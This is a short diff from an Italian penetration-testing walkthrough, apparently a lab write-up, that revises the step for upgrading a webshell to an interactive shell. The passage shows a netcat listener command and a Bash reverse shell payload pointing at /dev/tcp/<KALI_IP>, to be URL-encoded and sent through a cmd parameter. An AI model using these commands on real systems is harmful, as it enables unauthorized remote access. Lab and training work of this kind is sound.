@@ -1355,7 +1355,7 @@ Per una gestione più comoda, passiamo dalla webshell a una shell interattiva.
 
 1. **Listener**: Sulla macchina Kali, avviamo un listener: `nc -lvp 54321`.
 2. **Payload**: Utilizziamo una _reverse shell in Bash_.
-   * _Comando_: `bash -i >& /dev/tcp/[IP_KALI]/54321 0>&1`.
+   * _Comando_: `/bin/bash -c "bash -i>& /dev/tcp/<KALI_IP>/54321 0>&1"`
    * Importante: Il payload deve essere URL-encoded (tramite Burp Decoder) prima di essere inviato tramite il parametro `?cmd=`.
 3. Connessione: Ricevuta la shell, possiamo esplorare il file system.
 
